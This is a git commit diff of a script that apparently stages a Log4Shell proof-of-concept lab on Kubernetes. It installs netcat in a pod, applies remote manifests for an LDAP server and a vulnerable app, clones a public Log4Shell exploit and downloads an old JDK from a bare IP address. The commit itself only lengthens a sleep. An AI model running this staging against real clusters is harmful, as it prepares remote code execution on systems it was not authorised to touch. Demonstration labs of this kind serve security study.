69b848aa3a3d8c3d99e025df4595a720feba8c51
Nanda_Kumar <42697805+nandakrr@users.noreply.github.com>
2022-02-23 11:01:16 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 kubectl run nc-pod --image=ubuntu --command -- bash -c 'apt update && apt install -y wget netcat git python3-pip && while true; do sleep 1; done'
 kubectl apply -f https://raw.githubusercontent.com/nandakrr/log4j-poc/main/k8s-ldap-deploy.yaml
 kubectl apply -f https://raw.githubusercontent.com/nandakrr/log4j-poc/main/k8s-app-deploy.yaml
-sleep 30
+sleep 60
 kubectl exec -it nc-pod -- git clone https://github.com/kozmer/log4j-shell-poc
 kubectl exec -it nc-pod -- wget 152.67.166.153/jdk-8u20-linux-x64.tar.gz
 kubectl exec -it nc-pod -- tar -xf jdk-8u20-linux-x64.tar.gz
